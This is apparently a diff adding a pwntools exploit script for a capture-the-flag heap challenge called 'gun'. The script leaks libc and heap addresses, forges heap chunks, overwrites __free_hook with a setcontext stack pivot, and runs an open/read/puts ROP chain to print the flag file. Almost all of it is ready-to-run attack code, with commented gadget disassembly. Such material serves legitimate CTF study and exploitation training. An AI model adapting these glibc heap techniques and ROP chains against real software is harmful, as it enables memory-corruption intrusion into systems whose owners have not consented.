@@ -1,0 +1,221 @@
+#!/usr/bin/env python3
+#-*- coding:utf-8 -*-
+# Author: i0gan
+# Env: Linux arch 5.8.14-arch1-1
+
+from pwn import *
+import os
+
+r   =  lambda x : io.recv(x)
+ra  =  lambda   : io.recvall()
+rl  =  lambda   : io.recvline(keepends = True)
+ru  =  lambda x : io.recvuntil(x, drop = True)
+s   =  lambda x : io.send(x)
+sl  =  lambda x : io.sendline(x)
+sa  =  lambda x, y : io.sendafter(x, y)
+sla =  lambda x, y : io.sendlineafter(x, y)
+ia  =  lambda : io.interactive()
+c   =  lambda : io.close()
+li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
+
+context.log_level='debug'
+context.terminal = ['tmux', 'splitw', '-h']
+context.arch = 'amd64'
+
+elf_path  = 'gun'
+libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
+#libc_path = './libc.so.6'
+
+# remote server ip and port
+server_ip = "0.0.0.0"
+server_port = 0
+
+# if local debug
+LOCAL = 1
+LIBC = 1
+
+#--------------------------func-----------------------------
+def db():
+	if(LOCAL):
+		gdb.attach(io)
+
+def shoot(t):
+	sla('>', '1')
+	sla(':', str(t))
+
+def load(n):
+	sla('>', '2')
+	sla('?', str(n))
+
+def buy(n, d):
+	sla('>', '3')
+	sla(':', str(n))
+	sa(':', d)
+
+def quit():
+	sla('>', '4')
+	
+	
+
+#--------------------------exploit--------------------------
+def exploit():
+	li('exploit...')
+	# leak libc
+	sla(':', 'I0gan')
+	buy(0x450, 'X' * 0x10 + '\n') # 0
+	buy(0x10, 'A' * 8 + '\n') # 1
+	load(0)
+	shoot(1)
+	buy(0x10, 'X' * 8 +'\n'); # 0
+	load(0)
+	shoot(1)
+	libc_base = u64(ru('\x7f')[-5:] + b'\x7f\x00\x00') - 0x1ebf80 - 96
+	li('libc_base :' + hex(libc_base))
+	# release
+	load(1)
+	shoot(1)
+
+	for _ in range(5):
+		buy(0x10, 'A\n');
+	for i in range(5):
+		shoot(4 - i)
+
+	# leak heap base
+	p = p64(0) * 0x10
+	p += p64(0) + p64(0x31) # fake chunk
+	p += p64(0) * 5 + p64(0x21) + b'\n'
+	buy(0x410, p) # 0
+
+	buy(0x20, 'a\n') # 1
+	for i in range(6):
+		buy(0x10, 'A\n') # 1 ~ 7
+
+	load(7)
+	load(1) # 1
+	shoot(3)
+	db()
+
+	load(0)
+	shoot(1)
+
+	buy(0x20, '\n') # 0
+	load(0)
+	shoot(1)
+	ru('The ')
+	leak = u64(r(6) + b'\x00\x00')
+	heap_base = leak - (0x55962cf186e0 - 0x55962cf18000 )
+	li('heap base' + hex(heap_base))
+	
+	libc.address = libc_base
+	setcontext = libc.sym['setcontext'] + 0x3d
+	free_hook  = libc.sym['__free_hook']
+	rdx_and_call = libc_base + 0x1547a0
+	pop_rax = libc_base + 0x4a550
+	pop_rdi = libc_base + 0x26b72
+	pop_rsi = libc_base + 0x27529
+	pop_rdx_r12 = libc_base + 0x11c1e1
+	ret = libc_base + 0x25679
+	syscall = libc_base + 0x2584d
+
+	p = p64(0)
+	p += p64(heap_base + 0x750 + 0x10) # set rdx
+	p += p64(0) * 4
+	p += p64(setcontext) # call [rdx + 0x20]
+	p += b'./flag\x00\x00' # heap_base + 0x750 + 0x38 = 0x788
+	p = p.ljust(0x80, b'\x00') # rdx + 0x90
+
+	p += p64(0)         # prev_size
+	p += p64(0x31)      # size
+	p += p64(free_hook) # fd
+	p += p64(0) * 3
+	p += p64(heap_base + 0x750 + 0x100) # mov rsp, [rdx + 0xa0]
+	p += p64(ret) # avoid push rcx
+	p = p.ljust(0x100, b'\x00')
+
+	flag_addr = heap_base + 0x788
+	# open	
+	rop_open = flat([
+	pop_rdi , flag_addr,
+	pop_rsi , 0,
+	libc.sym['open']
+	])
+
+	rop_read = flat([
+	pop_rdi, 3,
+	pop_rsi, flag_addr,
+	pop_rdx_r12, 0x100, 0,
+	libc.sym['read']
+	])
+
+	rop_puts = flat([
+	pop_rdi, flag_addr,
+	libc.sym['puts']
+	])
+
+	rop = rop_open
+	rop += rop_read
+	rop += rop_puts
+	p += rop
+	p += b'\n'
+	buy(0x1c0, p) # 0
+
+	li('setcontext: ' + hex(setcontext))
+
+	buy(0x20, '\n') # for ajust  1
+	buy(0x20, p64(rdx_and_call) + b'\n') # 2
+	load(0)
+	#db()
+	shoot(1)
+
+'''
+.text:00000000001547A0                 mov     rdx, [rdi+8]
+.text:00000000001547A4                 mov     [rsp+0C8h+var_C8], rax
+.text:00000000001547A8                 call    qword ptr [rdx+20h]
+.text:00000000001547AB                 mov     qword ptr [rbx], 0
+.text:00000000001547B2                 mov     rax, [rsp+0C8h+var_C8]
+'''
+
+#setcontext
+# 
+# 0x7f6c8f6f21c6 <setcontext+294>    mov    rcx, qword ptr [rdx + 0xa8]
+# push rcx
+
+'''
+.text:00000000000580DD                 mov     rsp, [rdx+0A0h]
+.text:00000000000580E4                 mov     rbx, [rdx+80h]
+.text:00000000000580EB                 mov     rbp, [rdx+78h]
+.text:00000000000580EF                 mov     r12, [rdx+48h]
+.text:00000000000580F3                 mov     r13, [rdx+50h]
+.text:00000000000580F7                 mov     r14, [rdx+58h]
+.text:00000000000580FB                 mov     r15, [rdx+60h]
+.text:00000000000580FF                 test    dword ptr fs:48h, 2
+.text:000000000005810B                 jz      loc_581C6
+.text:0000000000058111                 mov     rsi, [rdx+3A8h]
+.text:0000000000058118                 mov     rdi, rsi
+.text:000000000005811B                 mov     rcx, [rdx+3B0h]
+'''
+	
+
+def finish():
+	ia()
+	c()
+
+#--------------------------main-----------------------------
+if __name__ == '__main__':
+	
+	if LOCAL:
+		elf = ELF(elf_path)
+		if LIBC:
+			libc = ELF(libc_path)
+			io = elf.process(env = {"LD_PRELOAD" : libc_path} )
+		else:
+			io = elf.process()
+	
+	else:
+		elf = ELF(elf_path)
+		io = remote(server_ip, server_port)
+		if LIBC:
+			libc = ELF(libc_path)
+
+	exploit()
+	finish()
